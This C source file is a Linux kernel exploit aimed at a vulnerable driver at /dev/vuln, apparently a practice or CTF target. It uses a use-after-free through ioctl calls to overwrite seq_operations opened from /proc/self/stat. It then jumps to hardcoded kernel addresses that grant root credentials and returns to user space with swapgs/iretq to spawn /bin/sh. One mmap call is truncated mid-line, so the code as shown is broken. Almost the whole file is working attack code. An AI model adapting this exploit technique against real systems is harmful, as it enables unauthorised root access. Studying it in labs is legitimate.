#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>

#define CMD_COPY 0xf001
#define CMD_FREE 0xf002
#define CMD_ALLC 0xf000

void get_shell() {
    char *arg[] = {"/bin/sh", NULL};
    char *env[] = {NULL};

    if(getuid() == 0) {
        printf("got dat root :D D:\n");
        execve(arg[0], arg, env);
    } else {
        printf("aint got dat root :|\n");
    }
}

unsigned long user_rip = (unsigned long)get_shell;
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
        __asm__(
                ".intel_syntax noprefix;"
                "mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                ".att_syntax;"
        );
}

void escalate_privs(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rdi, 0xffffffff81e3bfa0;"
        "movabs rax, 0xffffffff812a1050;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}


typedef struct {
    size_t size;
    char *data;
} request_t;


int main(int argc, char *argv[]) {
    int fd = open("/dev/vuln", O_RDWR);
    if(fd < 0) {
        fprintf(stderr, "Failed to open file: %m\n");
        return -1;
    }

    void *addr = (void *)0x88fff000;
    void *p = mmap(addr, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | M;
    if(p == MAP_FAILED) {
        fprintf(stderr, "mmap error: %m\n");
        return -1;
    }

    printf("mem mapped\n");
    save_state();

    uint64_t escalate = (uint64_t)&escalate_privs;


    printf("code copied to 0x%lx\n", escalate);

    request_t req;

    req.size = 0x20;
    req.data = malloc(req.size);
    
    uint64_t gadget = 0xffffffff8175b614ULL;
    memcpy(req.data, &escalate, sizeof(gadget));

    printf("copied gadget bruv\n");

    if(ioctl(fd, CMD_ALLC, &req)) {
        fprintf(stderr, "CMD_ALLC failed: %m\n");
        return -1;
    }

    if(ioctl(fd, CMD_FREE, &req)) {
        fprintf(stderr, "CMD_FREE failed: %m\n");
        return -1;
    }

    int seq_fd = open("/proc/self/stat", O_RDONLY);
    if(seq_fd < 0) {
        fprintf(stderr, "unable to open stat: %m\n");
        return -1;
    }

    printf("stat opened...");

    getchar();

    if(ioctl(fd, CMD_COPY, &req)) {
        fprintf(stderr, "CMD_ALLC failed: %m\n");
        return -1;
    }

    printf("have we overwritten seq_ops?\n");

    getchar();

    read(seq_fd, req.data, 0x10);

    printf("did we overwrite???\n");

    return 0;
}
